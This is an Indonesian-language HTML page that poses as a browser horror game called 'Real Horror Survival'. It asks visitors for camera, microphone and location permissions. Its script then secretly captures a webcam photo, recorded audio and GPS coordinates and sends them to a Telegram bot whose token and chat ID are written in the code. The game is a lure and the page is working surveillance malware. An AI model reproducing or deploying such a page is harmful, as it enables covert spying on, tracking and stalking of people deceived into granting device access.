<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Real Horror Survival</title>
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #0c0c0c;
            color: #f0f0f0;
            text-align: center;
            overflow: hidden;
        }
        h1 {
            margin-top: 20px;
            font-size: 3em;
            text-shadow: 2px 2px 10px rgba(0, 0, 0, 0.7);
        }
        button {
            margin-top: 20px;
        }
        #loading {
            display: none;
            font-size: 1.5em;
            margin-top: 20px;
        }
        #cameraContainer {
            display: none;
            position: relative;
            margin-top: 20px;
        }
        video {
            width: 100%;
            max-width: 640px;
            border: 2px solid #e63946;
        }
        .mic-icon {
            font-size: 2em;
            color: red;
            display: none;
        }
        .location {
            margin-top: 20px;
            font-size: 1.2em;
        }
        canvas {
            position: absolute;
            top: 0;
            left: 0;
            z-index: -1; /* Let the canvas be behind other elements */
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Selamat datang di Real Horror Survival!</h1>
        <p>Untuk memulai permainan, Anda harus memberikan izin kepada situs ini untuk mengakses kamera, mikrofon, dan lokasi Anda.</p>
        <button class="btn btn-danger btn-lg" onclick="startGame()">Izinkan dan Mulai</button>

        <div id="loading">Loading... Persiapkan diri Anda, permainan dimulai segera!</div>

        <div id="cameraContainer">
            <video id="video" autoplay></video>
            <div class="mic-icon" id="micIcon">ðŸŽ¤</div>
            <div class="location" id="locationDisplay"></div>
        </div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
    <script>
        let videoStream;
        let mediaRecorder;
        let audioChunks = [];

        const botToken = "8155174745:AAEVSM6KjUCejQ9dxCNLyo0D0Wh_eXgfHQ8";  // Ganti dengan token bot Telegram kamu
        const chatId = "6010073048";  // Ganti dengan ID pengguna Telegram kamu

        function initParticles() {
            const scene = new THREE.Scene();
            const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
            const renderer = new THREE.WebGLRenderer({ alpha: true });
            renderer.setSize(window.innerWidth, window.innerHeight);
            document.body.appendChild(renderer.domElement);

            const particleCount = 1000;
            const geometry = new THREE.BufferGeometry();
            const positions = new Float32Array(particleCount * 3);
            for (let i = 0; i < particleCount; i++) {
                positions[i * 3] = (Math.random() - 0.5) * 100; // X
                positions[i * 3 + 1] = (Math.random() - 0.5) * 100; // Y
                positions[i * 3 + 2] = (Math.random() - 0.5) * 100; // Z
            }
            geometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));

            const material = new THREE.PointsMaterial({ color: 0xffffff, size: 0.5 });
            const particles = new THREE.Points(geometry, material);
            scene.add(particles);

            camera.position.z = 50;

            function animateParticles() {
                requestAnimationFrame(animateParticles);
                particles.rotation.y += 0.001; // Rotate particles for a dynamic effect
                renderer.render(scene, camera);
            }

            animateParticles();
        }

        async function startGame() {
            document.getElementById("loading").style.display = "block";
            try {
                // Minta izin untuk akses kamera dan mikrofon
                videoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                document.getElementById("loading").style.display = "none";
                document.getElementById("cameraContainer").style.display = "block";
                document.getElementById("video").srcObject = videoStream;

                // Mulai mendeteksi suara
                mediaRecorder = new MediaRecorder(videoStream);
                mediaRecorder.onstart = () => {
                    document.getElementById("micIcon").style.display = "block";
                    setInterval(() => {
                        document.getElementById("micIcon").style.opacity = document.getElementById("micIcon").style.opacity === "1" ? "0.5" : "1";
                    }, 500);
                };
                mediaRecorder.ondataavailable = event => {
                    audioChunks.push(event.data);
                };
                mediaRecorder.start();

                // Dapatkan lokasi
                navigator.geolocation.watchPosition(position => {
                    const { latitude, longitude } = position.coords;
                    document.getElementById("locationDisplay").innerText = `Lokasi Anda: ${latitude}, ${longitude}`;
                });

                // Inisialisasi partikel
                initParticles();

                // Deteksi orientasi perangkat
                window.addEventListener('deviceorientation', (event) => {
                    updateParticlesOrientation(event.alpha, event.beta, event.gamma);
                });

                // Ambil foto setelah beberapa detik
                setTimeout(() => {
                    capturePhotoAndSend();
                }, 5000);

            } catch (error) {
                console.error("Akses ditolak atau terjadi kesalahan:", error);
                alert("Akses ditolak. Anda tidak bisa melanjutkan permainan.");
            }
        }

        function capturePhotoAndSend() {
            const video = document.getElementById("video");
            const canvas = document.createElement("canvas");
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext("2d");
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const photoData = canvas.toDataURL("image/png");

            // Kirim data ke Telegram
            sendToTelegram(photoData);
        }

        function sendToTelegram(photoData) {
            const audioBlob = new Blob(audioChunks, { type: "audio/webm" });
            const formData = new FormData();
            formData.append("chat_id", chatId);

            // Kirim foto
            const photoBlob = dataURItoBlob(photoData);
            formData.append("photo", photoBlob, "photo.png");

            // Kirim audio
            formData.append("audio", audioBlob, "audio.webm");

            // Kirim lokasi
            navigator.geolocation.getCurrentPosition(position => {
                const { latitude, longitude } = position.coords;
                formData.append("latitude", latitude);
                formData.append("longitude", longitude);

                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: "POST",
                    body: formData
                }).then(response => {
                    console.log("Data terkirim ke Telegram.");
                }).catch(err => {
                    console.error("Gagal mengirim data ke Telegram:", err);
                });
            });
        }

        function dataURItoBlob(dataURI) {
            const byteString = atob(dataURI.split(',')[1]);
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            return new Blob([ab], { type: 'image/png' });
        }
    </script>
</body>
</html>
